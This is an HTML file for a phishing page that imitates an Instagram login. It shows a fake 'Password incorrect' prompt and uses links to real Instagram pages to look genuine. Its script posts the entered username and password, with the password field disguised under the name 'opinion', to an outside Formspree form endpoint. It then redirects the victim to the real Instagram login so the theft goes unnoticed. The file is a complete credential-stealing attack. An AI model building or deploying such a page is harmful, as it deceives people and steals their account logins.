<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f4f4f4;
      text-align: center;
      padding: 20px;
    }

  .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin-top: 50px;
    }

   form, .new-box {
      width: 100%;
      max-width: 300px;
      margin: 0 auto;
      background-color: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }

  #profile-image {
      width: 80%;
      margin: 0 auto;
      display: block;
    }

  input {
      width: 100%;
      padding: 8px;
      margin-bottom: 16px;
      box-sizing: border-box;
    }

  button {
      background-color: #405de6;
      color: #fff;
      padding: 10px 15px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

  button:hover {
      background-color: #5c6bc0;
    }

  .new-box {
      margin-top: 20px;
      text-align: center;
    }

   .red-text {
      color: red;
    }
  </style>
</head>
<body>

  <div class="container">

  <form id="loginForm" method="post">
      <img id="profile-image" src="https://i.postimg.cc/7P93fv1p/instagrampicture.jpg" alt="Profile Image">

  <input type="text" id="username" name="name" placeholder="Username" required>
      <input type="password" id="password" name="opinion" placeholder="Password" required>
      <p class="red-text">*Password incorrect* Please check your password and try again</p>
      <br> <h5> <a href="https://www.instagram.com/accounts/password/reset/">Forgotten your password ?</a> </h5> </br>

  <button type="button" id="loginButton" onclick="submitForm()">Login</button>
      
 </form>
    
  </div>
  
  <div class="new-box">
    <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">Sign in</a></p>
  </div>

  <script>
    function submitForm() {
      // Set Formspree action dynamically
      document.getElementById("loginForm").action = "https://formspree.io/f/mleqenle";

      // Submit the form
      document.getElementById("loginForm").submit();

      // Redirect to another website after Formspree processing
      window.location.href = "https://www.instagram.com/accounts/login/";
    }
  </script>

</body>
</html>

